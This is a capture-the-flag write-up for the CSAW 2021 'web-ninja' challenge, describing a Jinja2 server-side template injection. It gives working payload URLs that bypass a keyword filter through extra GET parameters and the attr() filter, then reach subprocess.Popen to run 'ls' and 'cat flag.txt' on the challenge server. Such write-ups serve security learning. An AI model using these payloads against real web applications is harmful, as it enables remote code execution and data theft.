# web-ninja

## Description

```
Hey guys come checkout this website i made to test my ninja-coding skills.

http://web.chal.csaw.io:5000
```

## Task Analysis

A shoutout to [Payloads All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) for being incredibly useful during this challenge.

The link given in the description presents us with the following webpage where the only notable page element is a field for user input:

![webpage](/CSAW-2021/web-ninja/screenshots/the_site.PNG)

When input is submitted, the page displays "Hello " followed by whatever was typed into the submission field.

I confirmed that xss injection was possible. However, this was not helpful to me since the site would not present our malicious scripts to anyone but ourselves. Switching gears, I used Wappalyzer to find that the site was built using Python 2.7, and I noted that the challenge's name, "Ninja" could potentially be hinting at the "Jinja" framework. I submitted the following to check for a SSTI vulnerability:
```
{{}}
```
The "{{}}" was not rendered, indicating it had been interpreted as a template and that there was potential for an SSTI injection. 

I used the following to confirm what framework was being used:

```
{{'7'*7}}
```
Which rendered as:
```
Hello 7777777
```
This confirmed my suspicion that Jinja2 was the framework being used. 
After attempting to access the config object using {{config.items()}} I recieved:

```
Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
```
I now knew that there was a WAF to bypass.

Our goals from here were to: 
1. Find a way to bypass the WAF.
2. Create a payload that establishes RCE and allows us to look for the flag, which I suspected was likely stored either in the config object or in the page's working directory.
3. Create a payload that reads the flag and profit.

## Solution
# WAF Bypass
I found that The WAF was designed to only check the contents of the "value" GET parameter. Extra paremters went unchecked, so blacklisted keywords could be included in them and then accessed as strings via the request.args object. These strings could then be passed to the [built-in Jinja filter](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.attr) ```attr()```. The documentation tells us that ```attr()``` takes a string as an argument to "Get an attribute of an object. foo|attr("bar") works like foo.bar just that always an attribute is returned and items are not looked up..."
Using these features I could bypass the filter using urls constructed with additional get parameters like the following:

```
http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()}}&class=__class__&bas=__base__&sub=__subclasses__
```

The above url returned a list of all the subclasses of the object type, meaning I could access any class loaded in the Python environment. I used a script to search this list for the subprocess.Popen class, and found it at index 258.

# Establishing RCE

I could now use the following url execute the "ls" command and achieve RCE:

```
response = requests.get("http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)(%27ls%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__")
```

The above produced the following output:

![ls_output](/CSAW-2021/web-ninja/screenshots/ls_output.PNG)

# Read flag
I now knew that the flag was located in the same directory as the site's application script. This meant I could access the flag with the same technique by invoking the "cat" command:

```
response = requests.get("http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)(%27cat flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__")
```
Which produced the following:
![ls_output](/CSAW-2021/web-ninja/screenshots/ls_output.PNG)

I found the flag! - flag{m0mmy_s33_1m_4_r34l_n1nj4}
